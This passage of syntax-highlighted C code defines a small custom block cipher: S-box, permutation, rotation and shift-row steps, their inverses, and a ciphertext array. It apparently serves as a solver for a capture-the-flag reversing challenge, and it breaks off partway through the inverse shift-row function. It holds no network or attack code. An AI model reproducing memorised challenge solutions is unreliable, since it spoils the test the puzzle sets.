<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">comp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sbox</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">p</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">inv_sbox</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">rol</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">n</span><span class="p">){</span>
    <span class="k">return</span> <span class="p">((</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">n</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">ror</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">n</span><span class="p">){</span>
    <span class="k">return</span> <span class="p">((</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">n</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">sub</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[]){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">sbox</span><span class="p">[</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]];</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">shift_row</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[]){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">d</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">];</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">];</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">];</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">=</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">12</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">enc</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[]){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">^=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">|</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">);</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">a</span><span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span> <span class="o">+=</span> <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">],</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">&amp;</span><span class="mi">7</span><span class="p">);</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">xr</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[],</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">b</span><span class="p">[]){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">inv_enc</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[]){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">t</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">15</span> <span class="o">-</span> <span class="n">i</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">ror</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">],</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">&amp;</span><span class="mi">7</span><span class="p">);</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">15</span> <span class="o">-</span> <span class="n">i</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span> <span class="o">-=</span> <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">15</span> <span class="o">-</span> <span class="n">i</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">^=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">|</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">inv_shift_row</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[]){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">d</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">];</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">];</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">12</span><span class="p">];</span>
